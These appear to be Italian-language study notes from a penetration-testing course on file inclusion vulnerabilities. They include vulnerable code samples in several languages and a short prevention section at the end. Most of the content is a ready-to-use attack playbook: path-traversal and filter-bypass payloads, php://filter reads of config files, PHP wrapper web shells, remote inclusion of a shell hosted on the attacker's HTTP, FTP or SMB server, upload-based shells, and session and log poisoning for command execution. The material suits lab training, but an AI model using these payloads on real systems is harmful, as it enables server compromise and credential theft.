# Intro
Molti linguaggi back-end moderni, come PHP, Javascript o Java, utilizzano i parametri HTTP per specificare ciò che viene mostrato nella pagina web, il che consente di creare pagine web dinamiche, ridurre le dimensioni complessive dello script e semplificare il codice. In questi casi, i parametri vengono utilizzati per specificare quale risorsa viene mostrata nella pagina. Se queste funzionalità non sono codificate in modo sicuro, un utente malintenzionato può manipolare questi parametri per visualizzare il contenuto di qualsiasi file locale sul server di hosting, causando una vulnerabilità di tipo Local File Inclusion (LFI).

Il luogo più comune in cui si trova LFI sono i motori di template. Per far sì che la maggior parte dell'applicazione web abbia lo stesso aspetto quando si naviga tra le pagine, un motore di template visualizza una pagina che mostra le parti statiche comuni, come l'intestazione, la barra di navigazione e il piè di pagina, e poi carica dinamicamente altri contenuti che cambiano tra le pagine. Altrimenti, ogni pagina del server dovrebbe essere modificata quando vengono apportate modifiche a una qualsiasi delle parti statiche. Questo è il motivo per cui spesso si vede un parametro come `/index.php?page=about`, in cui `index.php` imposta il contenuto statico (ad esempio, intestazione/piè di pagina) e poi preleva solo il contenuto dinamico specificato nel parametro, che in questo caso può essere letto da un file chiamato about.php. Poiché abbiamo il controllo sulla parte about della richiesta, è possibile che l'applicazione web prenda altri file e li visualizzi sulla pagina.

Le vulnerabilità LFI possono portare alla divulgazione del codice sorgente, all'esposizione di dati sensibili e persino all'esecuzione di codice remoto in determinate condizioni. La divulgazione del codice sorgente può consentire agli aggressori di testare il codice alla ricerca di altre vulnerabilità, che potrebbero rivelare vulnerabilità precedentemente sconosciute. Inoltre, la fuoriuscita di dati sensibili può consentire agli aggressori di enumerare il server remoto alla ricerca di altre debolezze o addirittura di far trapelare credenziali e chiavi che potrebbero consentire loro di accedere direttamente al server remoto. In determinate condizioni, LFI può anche consentire agli aggressori di eseguire codice sul server remoto, compromettendo l'intero server back-end e tutti gli altri server ad esso collegati.

# Esempio di codice vulnerabile

## PHP

```php
if (isset($_GET['language'])) {
    include($_GET['language']);
}
```

la vulnerabilita' LFI sta nel fatto che l'argomento di `include()` e' preso direttamente dal parametro dell'url e non e' in nessun modo sanificata/filtrata. altre funzioni simili sono `include_once()`, `require()`, `require_once()`, `file_get_contents()`

## nodejs
Il seguente è un esempio di base di come un parametro GET viene utilizzato per controllare quali dati vengono scritti in una pagina:
```js
if(req.query.language) {
    fs.readFile(path.join(__dirname, req.query.language), function (err, data) {
        res.write(data);
    });
}
```
Come si può vedere, qualsiasi parametro passato dall'URL viene utilizzato dalla funzione `readfile`, che poi scrive il contenuto del file nella risposta HTTP. 

Un altro esempio è la funzione `render()` del framework Express.js. L'esempio seguente utilizza il parametro language per determinare la directory da cui prelevare la pagina `about.html`

```js
app.get("/about/:language", function(req, res) {
    res.render(`/${req.params.language}/about.html`);
});

```
A differenza degli esempi precedenti, in cui i parametri GET erano specificati dopo un carattere (?) nell'URL, l'esempio precedente prende il parametro dal percorso dell'URL (ad esempio, `/about/it` o `/about/es`). Poiché il parametro è usato direttamente nella funzione `render()` per specificare il file reso, possiamo cambiare l'URL per mostrare un file diverso.

## java
Lo stesso concetto si applica a molti altri server Web. Gli esempi seguenti mostrano come le applicazioni web per un server web Java possono includere file locali in base al parametro specificato, utilizzando la funzione include:

```jsp
<c:if test="${not empty param.language}">
    <jsp:include file="<%= request.getParameter('language') %>" />
</c:if>
```

La funzione `include` può prendere come argomento un file o l'URL di una pagina e quindi rende l'oggetto nel template del front-end, in modo simile a quanto visto in precedenza con NodeJS. La funzione `import` può anche essere usata per rendere un file locale o un URL, come nell'esempio seguente:

```jsp
<c:import url= "<%= request.getParameter('language') %>"/>
```
## .net

Infine, facciamo un esempio di come le vulnerabilità di inclusione di file possano verificarsi nelle applicazioni web .NET. La funzione Response.WriteFile funziona in modo molto simile a tutti gli esempi precedenti, in quanto prende in input un percorso di file e ne scrive il contenuto nella risposta. Il percorso può essere recuperato da un parametro GET per il caricamento dinamico del contenuto, come segue:

```cs
@if (!string.IsNullOrEmpty(HttpContext.Request.Query['language'])) {
    <% Response.WriteFile("<% HttpContext.Request.Query['language'] %>"); %> 
}
```

Inoltre, la funzione `@Html.Partial()` può anche essere usata per rendere il file specificato come parte del template del front-end, in modo simile a quanto visto in precedenza:

```cs
@Html.Partial(HttpContext.Request.Query['language'])
```

Infine, la funzione include può essere usata per rendere i file locali o gli URL remoti e può anche eseguire i file specificati:

```cs
<!--#include file="<% HttpContext.Request.Query['language'] %>"-->
```

# Attacchi di secondo ordine

Come possiamo vedere, gli attacchi LFI possono assumere forme diverse. Un altro attacco LFI comune, e un po' più avanzato, è l'attacco di secondo ordine. Questo si verifica perché molte funzionalità delle applicazioni web possono prelevare in modo insicuro i file dal server back-end in base a parametri controllati dall'utente.

Ad esempio, un'applicazione web può consentirci di scaricare il nostro avatar tramite un URL del tipo (/profilo/$username/avatar.png). Se creiamo un nome utente LFI dannoso (ad esempio ../../../etc/passwd), potrebbe essere possibile cambiare il file estratto in un altro file locale sul server e prenderlo al posto del nostro avatar.

In questo caso, avveleneremmo una voce del database con un payload LFI dannoso nel nostro nome utente. Quindi, un'altra funzionalità dell'applicazione Web utilizzerebbe questa voce avvelenata per eseguire il nostro attacco (ossia scaricare il nostro avatar in base al valore del nome utente). Questo è il motivo per cui questo attacco è chiamato attacco di secondo ordine.

Gli sviluppatori spesso trascurano queste vulnerabilità, in quanto possono proteggere dall'input diretto dell'utente (ad esempio da un parametro della pagina), ma possono fidarsi dei valori estratti dal database, come il nostro nome utente in questo caso. Se riuscissimo ad avvelenare il nostro nome utente durante la registrazione, l'attacco sarebbe possibile.

Lo sfruttamento delle vulnerabilità LFI tramite attacchi di secondo ordine è simile a quello che abbiamo discusso in questa sezione. L'unica differenza è che dobbiamo individuare una funzione che estrae un file in base a un valore che controlliamo indirettamente e poi cercare di controllare quel valore per sfruttare la vulnerabilità.


# Path traversal
se non funziona il path assoluto perche' magari abbiamo 

```php
include("./languages/" . $_GET['language']);
```

possiamo provare a fare qualcosa tipo `../../../../etc/passwd`

# Filename Prefix 

L'include potrebbe avere un prefisso

```php
include("lang_" . $_GET['language']);
```

pin questo caso `../../../../etc/passwd` diventa `lang_../../../etc/passwd` e non funziona.
Quindi, invece di usare direttamente il path traverssal, possiamo anteporre un `/` al nostro payload e questo dovrebbe considerare il prefisso come una directory; quindi dovremmo bypassare il nome del file ed essere in grado di attraversare le directory. Atttenzione non sempre funziona!

# non-recursive path traversal filter

```php
$language = str_replace('../', '', $_GET['language']);
```
si baypassa con `....//....//....//....//etc/passwd`


# path approvati

```php
if(preg_match('/^\.\/languages\/.+$/', $_GET['language'])) {
    include($_GET['language']);
} else {
    echo 'Illegal path specified!';
}

```

si baypassa con `languages/../../../../etc/passwd`

# Encoding

potrebbe esserci un filtro per le cose encodade allora encoda (anche doppio passaggio eventualmente) prima di inviare

# estensione predefinita

se deve essere per forza un file `.php` per esempio possiamo provare con il nullbyte `/etc/passwd%00.php`


# filtri php
I filtri PHP sono un tipo di wrapper PHP, in cui possiamo passare diversi tipi di input e farli filtrare dal filtro che abbiamo specificato. Per utilizzare i flussi dei wrapper PHP, possiamo usare lo schema php:// nella nostra stringa e accedere al wrapper del filtro PHP con php://filtro/.

Il filter wrapper ha diversi parametri, ma i principali che ci servono per il nostro attacco sono resource e read. Il parametro resource è necessario per i filter wrapper e con esso possiamo specificare il flusso a cui vogliamo applicare il filtro (ad esempio un file locale), mentre il parametro read può applicare diversi filtri alla risorsa in ingresso, quindi possiamo usarlo per specificare quale filtro vogliamo applicare alla nostra risorsa.

Sono disponibili quattro diversi tipi di filtri: Filtri stringa, Filtri conversione, Filtri compressione e Filtri crittografia. Per saperne di più su ciascun filtro si può consultare il rispettivo link, ma il filtro utile per gli attacchi LFI è il filtro convert.base64-encode, sotto Filtri di conversione.

## fuzing di pagine php

```shell
$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://138.68.153.165:32174/FUZZ.php
```

## esempio di utilizzo di un filtro   

```shell
$ curl http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=configure
```

se vogliamo leggere il file `configure.php` e non riusciamo direttamnte, possiamo provare a codificarlo in base64


# RCE

Finora in questo modulo abbiamo sfruttato le vulnerabilità di inclusione dei file per rivelare i file locali attraverso vari metodi. Da questa sezione, inizieremo a imparare come utilizzare le vulnerabilità di inclusione di file per eseguire codice sui server back-end e ottenere il controllo su di essi.

Possiamo utilizzare molti metodi per eseguire comandi remoti, ognuno dei quali ha un caso d'uso specifico, poiché dipende dal linguaggio/framework del back-end e dalle capacità della funzione vulnerabile. Un metodo semplice e comune per ottenere il controllo del server back-end è quello di enumerare le credenziali utente e le chiavi SSH, per poi utilizzarle per accedere al server back-end tramite SSH o qualsiasi altra sessione remota. Ad esempio, possiamo trovare la password del database in un file come config.php, che potrebbe corrispondere alla password di un utente nel caso in cui riutilizzi la stessa password. Oppure possiamo controllare la directory .ssh nella home directory di ogni utente e, se i privilegi di lettura non sono impostati correttamente, potremmo essere in grado di prendere la sua chiave privata (id_rsa) e usarla per accedere al sistema SSH.

Oltre a questi metodi banali, esistono modi per ottenere l'esecuzione di codice remoto direttamente attraverso la funzione vulnerabile, senza fare affidamento sull'enumerazione dei dati o sui privilegi dei file locali.

ATTENZIONE con tutti e tre i wrapper sotto il comando va encodato URL

## Wrapper DATA

Il data wrapper può essere usato per includere dati esterni, compreso il codice PHP. Tuttavia, il data wrapper può essere utilizzato solo se l'impostazione (allow_url_include) è abilitata nella configurazione di PHP. Perciò, per prima cosa, verifichiamo se questa impostazione è abilitata, leggendo il file di configurazione di PHP attraverso la vulnerabilità di LFI.

```shell
$ curl "http://<SERVER_IP>:<PORT>/index.php?language=php://filter/read=convert.base64-encode/resource=../../../../etc/php/7.4/apache2/php.ini"
```

la versione di php va guessata, magari partendo dalla piu recente a risalire. 
verifichiamo che ci sia `allow_url_include` ATTENZIONE, NON ABILITA DI DEFOULT!

```shell
$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

se presente possiamo procedere con la creazione e lo sfruttamento  del nostro payload

```shell
$ echo '<?php system($_GET["cmd"]); ?>' | base64
PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+Cg==
$ curl -s 'http://<SERVER_IP>:<PORT>/index.php?language=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id' | grep uid
```


## Wrapper Input
Anche questo wrapper dipende dall'impostazione `allow_url_include`.

```shell
$ curl -s -X POST --data '<?php system($_GET["cmd"]); ?>' "http://<SERVER_IP>:<PORT>/index.php?language=php://input&cmd=id" | grep uid
```

## Wrapper Expect
Questo wreapper dipende dall'enstensione `expect`
Dopo aver ottenuto il `php.ini` possiamo controllare che sia presente

```shell
$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep expect
extension=expect
```
se presente possiamo sfruttaral cosi

```shell
$ curl -s "http://<SERVER_IP>:<PORT>/index.php?language=expect://id"
```

# Remote file inclusion

Finora in questo modulo ci siamo concentrati principalmente sull'inclusione locale di file (LFI). Tuttavia, in alcuni casi, possiamo anche includere file remoti "Remote File Inclusion (RFI)", se la funzione vulnerabile consente l'inclusione di URL remoti. Ciò consente due vantaggi principali:

- Enumerazione di porte e applicazioni web solo locali (ad es. SSRF).
- Ottenere l'esecuzione di codice remoto includendo uno script dannoso che ospitiamo.

In questa sezione, tratteremo come ottenere l'esecuzione di codice remoto attraverso le vulnerabilità RFI. Il modulo Attacchi lato server tratta varie tecniche di SSRF, che possono essere utilizzate anche con le vulnerabilità RFI.

## Verifica RFI
Tramite LFI possiamo verificare che sia possibile fare RFI, ovvero controllando il php.ini e cercando `allow_url_include = On`

```shell
$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
```

e proviamo per prima cosa ad includere un file locale 

```shell
$ curl http://10.129.29.114/index.php?language=http://127.0.0.1:80/index.php
```

## Exploit

creiamo la nostra piccola shell e serviamola con python
```shell
$  echo '<?php system($_GET["cmd"]); ?>' > shell.php
$  sudo python3 -m http.server 1337
```
poi proviamo a visitare l'url

```shell
$ curl http://<SERVER_IP>:<PORT>/index.php?language=http://<OUR_IP>:<LISTENING_PORT>/shell.php&cmd=id
```
altri esempi 
```shell
# FTP
$ sudo python -m pyftpdlib -p 21
$ curl http://<SERVER_IP>:<PORT>/index.php?language=ftp://<OUR_IP>/shell.php&cmd=id

# SMB
$ impacket-smbserver -smb2support share $(pwd)
$ curl http://<SERVER_IP>:<PORT>/index.php?language=\\<OUR_IP>\share\shell.php&cmd=whoami
```

# upload img

se possiamo caricare file, proviamo a generare il nostro paylod malevolo e carichiamolo

```shell
$ echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
```

ispezionando l'html o cmq il frontend o altre infor che abbiamo a disposizione cerchiamo di capire la cartella in cui risiede l'img e visitiamo l'url

```shell
$ curl http://<SERVER_IP>:<PORT>/index.php?language=./profile_images/shell.gif&cmd=id
```

# upload zip


```shell
$ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
$ http://<SERVER_IP>:<PORT>/index.php?language=zip://./profile_images/shell.jpg%23shell.php&cmd=id
```

# phar wrapper

file `shell.php`
```php
<?php
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');

$phar->stopBuffering();
```
compilazione e rinominare
```shell
$ php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```

visita

```shell
$ curl http://<SERVER_IP>:<PORT>/index.php?language=phar://./profile_images/shell.jpg%2Fshell.txt&cmd=id
```

# PHP Session Poisoning

I file di sessione, con impostazione di default, si trovano in:
- `/var/lib/php/sessions/` (linux)
- `C:\Windows\Temp\` (windows)
e hanno prefisso `sess_`. Quindi se abbiao un id di sessione `ciao`, il file e' `/var/lib/php/sessions/sess_ciao`

Prediamo il valore del cookie di sessione proviamo a fare una get

```shell
$ curl http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```
ci accorgiamo che ha come valori `page` e `preference`. Il valore `page` arriva direttamente dall'url visitato
quindi se visitiamo `?language=session_poisoning` poi otteniamo un `page: session_poisoning`

se utilizziamo, invece di una semplice stringa, un payload malevolo otteniamo una RCE

```shell
$ curl http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
$ curl http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd&cmd=id
```

# Server log poisoning
Sia Apache che Nginx mantengolo log di accesso e di errore. Attenzione per nginx non serve essere root, per leggere i log di apache si.

L'`access.log` salva tra le altre cose anche lo `User-Agent`, parametro sotto il nostro controllo. 

```shell
# nota nello skill assesment (log di nginx) ho dovuto metterlo senza virgolette
# <?php system($_GET[cmd]); ?>
# altrimenti si rompeva tutto 

$ curl -s "http://<SERVER_IP>:<PORT>/index.php" -A '<?php system($_GET["cmd"]); ?>'
$ curl -s http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log?cmd=id
```

utile anche per ottenere file tipo `/proc/self/environ` o `/proc/self/fd/N` (con N processid, tipicamente tra 0 e 50)
o anche altri file:

- `/var/log/sshd.log`
- `/var/log/mail`
- `/var/log/vsftpd.log`

# scansioni automatiche 

https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows

```shell
# con ffuf attenzione al filtro che tipicamente la pagina anche se non sta funzionando la LFI cmq e' status code 200 quindi usare i filtri sulle dimensioni per riuscire a capirci qualcosa

# scansione piu' precisa https://book.hacktricks.xyz/pentesting-web/file-inclusion#top-25-parameters
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value' -fs 2287

$ ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=FUZZ' -fs 2287
$ ffuf -w /usr/share/seclists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ/index.php' -fs 2287
$ ffuf -w ./LFI-WordList-Linux:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?language=../../../../FUZZ' -fs 2287


$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/apache2.conf
$ curl http://<SERVER_IP>:<PORT>/index.php?language=../../../../etc/apache2/envvars
```

# Prevenzione

The most effective thing we can do to reduce file inclusion vulnerabilities is to avoid passing any user-controlled inputs into any file inclusion functions or APIs

The best way to prevent directory traversal is to use your programming language's (or framework's) built-in tool to pull only the filename. For example, PHP has basename(), which will read the path and only return the filename portion. If only a filename is given, then it will return just the filename. If just the path is given, it will treat whatever is after the final / as the filename. The downside to this method is that if the application needs to enter any directories, it will not be able to do it

Several configurations may also be utilized to reduce the impact of file inclusion vulnerabilities in case they occur. For example, we should globally disable the inclusion of remote files. In PHP this can be done by setting `allow_url_fopen` and `allow_url_include` to Off.
It's also often possible to lock web applications to their web root directory, preventing them from accessing non-web related files. The most common way to do this in today's age is by running the application within Docker.

The universal way to harden applications is to utilize a Web Application Firewall (WAF), such as ModSecurity. When dealing with WAFs, the most important thing to avoid is false positives and blocking non-malicious requests